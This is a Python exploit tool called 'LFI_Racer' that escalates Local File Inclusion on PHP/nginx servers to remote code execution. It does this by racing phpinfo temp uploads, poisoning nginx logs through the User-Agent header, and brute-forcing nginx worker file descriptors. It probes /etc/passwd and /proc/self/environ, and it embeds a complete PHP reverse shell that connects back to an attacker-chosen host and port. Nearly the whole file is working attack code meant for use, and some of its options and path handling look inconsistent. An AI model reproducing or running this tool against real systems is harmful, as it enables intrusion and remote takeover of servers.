#!/usr/bin/env python3
import requests
import argparse
import threading
import random
import string
import socket
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NGINX_LOG_PATHS = [
    "/var/log/nginx/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx-access.log",
    "/var/log/nginx/%saccess.log",
    "/var/log/nginx/%serror.log",
]

REVERSE_SHELL = """<?php
$host = '%s';
$port = %s;
$cmd = 'id; whoami; /bin/sh -i';
$sock = fsockopen($host, $port, $err_no, $err_str, 10);
if (!$sock) die();
$pipes = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
$proc = proc_open($cmd, $pipes, $pipes_res);
if (!is_resource($proc)) die();
foreach ($pipes_res as $p) stream_set_blocking($p, 0);
stream_set_blocking($sock, 0);
while (!feof($sock) && !feof($pipes_res[1])) {
    $r = [$sock, $pipes_res[1], $pipes_res[2]];
    stream_select($r, $w, $e, null);
    foreach ($r as $fd) {
        if ($fd === $sock) fwrite($pipes_res[0], fread($sock, 1024));
        elseif ($fd === $pipes_res[1] || $fd === $pipes_res[2]) fwrite($sock, fread($fd, 1024));
    }
}
fclose($sock);
foreach ($pipes_res as $p) fclose($p);
proc_close($proc);
?>"""

def print_banner():
    cow_art = """
    ^__^
    (oo)\\_______
    (__)\\       )\\/\\
        ||----w |
        ||     ||    LFI_Racer - Exploit LFI to RCE
                    Made by Ossama
    """
    print(cow_art)

def print_help():
    help_text = """
LFI_Racer - A tool to exploit Local File Inclusion (LFI) vulnerabilities to achieve Remote Code Execution (RCE)
Made by Ossama

Usage: python3 lfi_racer.py [options]

Options:
  -m, --mode        Exploit mode: phpinfo, log, nginx (default: phpinfo)
  -l, --lfi         LFI URL (required), e.g., http://127.0.0.1/lfi.php?file=
  --lhost           Listener IP for reverse shell (required)
  --lport           Listener port for reverse shell (required)
  -p, --payload-type Payload type: 1=Perl, 2=Netcat, 3=PHP (default: 3)
  -s, --suffix      LFI URL suffix, e.g., %00 (default: empty)
  -t, --threads     Threads for phpinfo mode (default: 8)
  -i, --phpinfo     PHPInfo URL for phpinfo mode
  -f, --logfile     Custom log file path for log mode
  -v, --verbose     Enable verbose output (default: False)
  -h, --help        Show this help message and exit

Example:
  python3 lfi_racer.py -m phpinfo -l http://127.0.0.1/lfi.php?file= -i http://127.0.0.1/phpinfo.php --lhost 192.168.1.100 --lport 4444
    """
    print(help_text)

def craft_phpinfo_payload(target_host, phpinfo_endpoint, shell_code, filler):
    payload_data = f"""-----------------------------abcdef1234567890\r
Content-Disposition: form-data; name="upload"; filename="shell.txt"\r
Content-Type: text/plain\r
\r
{shell_code}
-----------------------------abcdef1234567890--\r"""
    return f"""POST {phpinfo_endpoint}?f={filler} HTTP/1.1\r
Cookie: session=abc123; data={filler}\r
Content-Type: multipart/form-data; boundary=---------------------------abcdef1234567890\r
Content-Length: {len(payload_data)}\r
Host: {target_host}\r
\r
{payload_data}"""

def test_lfi_vuln(base_url):
    test_paths = ["/etc/passwd", "/proc/self/environ", "/etc/issue"]
    for path in test_paths:
        try:
            resp = requests.get(f"{base_url}{path}", verify=False, timeout=5)
            if resp.status_code == 200:
                if "root:x:0:0" in resp.text or "PATH=" in resp.text or "Ubuntu" in resp.text:
                    return True
        except:
            continue
    return False

def test_rce_vuln(base_url, tag):
    test_payload = f"{tag}<?php echo 'RCE_TEST_' . uniqid(); ?>"
    headers = {"User-Agent": test_payload}
    try:
        requests.get(base_url, headers=headers, verify=False, timeout=5)
        for path in NGINX_LOG_PATHS:
            target = path % base_url.split("//")[1].split("/")[0] if "%s" in path else path
            resp = requests.get(f"{base_url}{target}", verify=False, timeout=5)
            if resp.status_code == 200 and "RCE_TEST_" in resp.text:
                return True
    except:
        pass
    return False

def exploit_phpinfo(base_url, tag, phpinfo_req, host, port, max_offset, verbose):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(phpinfo_req.encode())
    data = b""
    while len(data) < max_offset:
        chunk = sock.recv(max_offset - len(data))
        if not chunk:
            break
        data += chunk
    sock.close()
    try:
        idx = data.index(b"[tmp_name] =>")
        temp_path = data[idx+13:idx+50].decode().split("\0")[0]
        resp = requests.get(f"{base_url}{temp_path}", verify=False, timeout=5).text
        if verbose:
            print(f"[VERBOSE] Checking temp path: {temp_path}")
        if tag in resp:
            return temp_path
    except:
        pass
    return None

def exploit_log_injection(config, base_url, tag, shell_code, verbose):
    headers = {"User-Agent": shell_code}
    for _ in range(2):
        requests.get(config.lfi, headers=headers, verify=False, timeout=5)
    for path in NGINX_LOG_PATHS:
        target = path % config.lfi.split("//")[1].split("/")[0] if "%s" in path else path
        try:
            resp = requests.get(f"{base_url}{target}", verify=False, timeout=5).text
            if verbose:
                print(f"[VERBOSE] Testing log path: {target}")
            if tag in resp:
                return target
        except:
            continue
    return None

def exploit_nginx_temp(config, base_url, tag, shell_code, verbose):
    worker_pids = []
    resp = requests.get(f"{config.lfi}/proc/cpuinfo", verify=False, timeout=5)
    cpu_count = resp.text.count("processor")
    resp = requests.get(f"{config.lfi}/proc/sys/kernel/pid_max", verify=False, timeout=5)
    max_pid = int(resp.text)
    for pid in range(max_pid):
        resp = requests.get(f"{config.lfi}/proc/{pid}/cmdline", verify=False, timeout=5)
        if "nginx: worker process" in resp.text:
            worker_pids.append(pid)
            if len(worker_pids) >= cpu_count:
                break
    stop_event = threading.Event()
    def send_large_body():
        while not stop_event.is_set():
            try:
                requests.get(config.lfi, data=shell_code + "X" * 1024 * 16, verify=False, timeout=5)
            except:
                pass
    uploaders = [threading.Thread(target=send_large_body) for _ in range(8)]
    for u in uploaders:
        u.start()
    for pid in worker_pids:
        for fd in range(4, 32):
            path = f"/proc/self/fd/{pid}/../../../{pid}/fd/{fd}"
            try:
                resp = requests.get(f"{base_url}{path}", verify=False, timeout=5).text
                if verbose:
                    print(f"[VERBOSE] Testing Nginx FD: {path}")
                if tag in resp:
                    stop_event.set()
                    return path
            except:
                continue
    stop_event.set()
    for u in uploaders:
        u.join()
    return None

def execute_exploit(config, url_template, tag, shell_code, phpinfo_req, host, port, offset):
    if config.mode == "phpinfo":
        stop_event = threading.Event()
        attempt_count = [0]
        max_tries = 500
        lock = threading.Lock()
        shell_path = f"/tmp/{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))}.php"
        class ExploitThread(threading.Thread):
            def run(self):
                while not stop_event.is_set():
                    with lock:
                        if attempt_count[0] >= max_tries:
                            return
                        attempt_count[0] += 1
                    if exploit_phpinfo(url_template, tag, phpinfo_req, host, port, offset, config.verbose):
                        stop_event.set()
                        print(f"\nExploit worked! Shell at {shell_path}")
                        requests.get(f"{url_template}{shell_path}", verify=False, timeout=5)
                        return
        threads = [ExploitThread() for _ in range(config.threads)]
        for t in threads:
            t.start()
        try:
            while not stop_event.wait(1):
                with lock:
                    sys.stdout.write(f"\rAttempts: {attempt_count[0]}/{max_tries}")
                    sys.stdout.flush()
                    if attempt_count[0] >= max_tries:
                        break
            if not stop_event.is_set():
                print("\nPHPInfo exploit failed.")
        finally:
            stop_event.set()
            for t in threads:
                t.join()
    elif config.mode == "log":
        if log_path := exploit_log_injection(config, url_template, tag, shell_code, config.verbose):
            print(f"\nExploit worked! Log file: {log_path}")
            if config.payload_type == 3:
                shell_path = f"/tmp/{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))}.php"
                requests.get(f"{url_template}{shell_path}", verify=False, timeout=5)
                print(f"Shell created at {shell_path}")
        else:
            print("\nLog file exploit failed.")
    elif config.mode == "nginx":
        if temp_path := exploit_nginx_temp(config, url_template, tag, shell_code, config.verbose):
            print(f"\nExploit worked! Nginx temp file: {temp_path}")
        else:
            print("\nNginx temp file exploit failed.")

def run():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-m", "--mode", choices=["phpinfo", "log", "nginx"], default="phpinfo", help="Exploit mode")
    parser.add_argument("-l", "--lfi", help="LFI URL, e.g., http://127.0.0.1/lfi.php?file=")
    parser.add_argument("--lhost", help="Listener IP for reverse shell")
    parser.add_argument("--lport", type=int, help="Listener port")
    parser.add_argument("-p", "--payload-type", type=int, choices=[1, 2, 3], default=3, help="Payload: 1=Perl, 2=Netcat, 3=PHP")
    parser.add_argument("-s", "--suffix", default="", help="LFI URL suffix, e.g., %00")
    parser.add_argument("-t", "--threads", type=int, default=8, help="Threads for phpinfo mode")
    parser.add_argument("-i", "--phpinfo", help="PHPInfo URL for phpinfo mode")
    parser.add_argument("-f", "--logfile", help="Custom log file path for log mode")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-h", "--help", action="store_true", help="Show help message")
    config = parser.parse_args()
    if config.help or not any(vars(config).values()):
        print_banner()
        print_help()
        sys.exit(0)
    if not config.lfi or not config.lhost or not config.lport:
        print_banner()
        print("Error: --lfi, --lhost, and --lport are required")
        print_help()
        sys.exit(1)
    if config.mode == "phpinfo" and not config.phpinfo:
        print_banner()
        print("Error: --phpinfo required for phpinfo mode")
        print_help()
        sys.exit(1)
    print_banner()
    print("Checking for LFI vulnerability...")
    if not test_lfi_vuln(config.lfi):
        print("No LFI vulnerability found.")
        sys.exit(1)
    print("LFI confirmed. Checking for RCE potential...")
    if not test_rce_vuln(config.lfi, "RCECheck"):
        print("No RCE potential detected.")
        sys.exit(1)
    print("RCE possible. Setting up exploit...")
    url_template = config.lfi + "%s" + (f"%{config.suffix}" if config.suffix else "")
    tag = "ExploitMarker"
    shell_code = f"{tag}\r\n{REVERSE_SHELL % (config.lhost, config.lport)}\r\n"
    if config.mode == "phpinfo":
        host = config.phpinfo.split("//")[1].split("/")[0]
        port = 80
        if ":" in host:
            host, port = host.split(":")
            port = int(port)
        phpinfo_endpoint = "/" + config.phpinfo.split("//")[1].split("/", 1)[1]
        phpinfo_req = craft_phpinfo_payload(host, phpinfo_endpoint, shell_code, "Y" * 4000)
        offset = 4000
    else:
        host, port, phpinfo_req, offset = None, None, None, None
    if config.logfile:
        NGINX_LOG_PATHS.append(config.logfile)
    print(f"Launching exploit: Mode={config.mode}, Payload={config.payload_type}")
    print(f"Listener: {config.lhost}:{config.lport}")
    execute_exploit(config, url_template, tag, shell_code, phpinfo_req, host, port, offset)
    print("Exploit attempt completed.")

if __name__ == "__main__":
    run()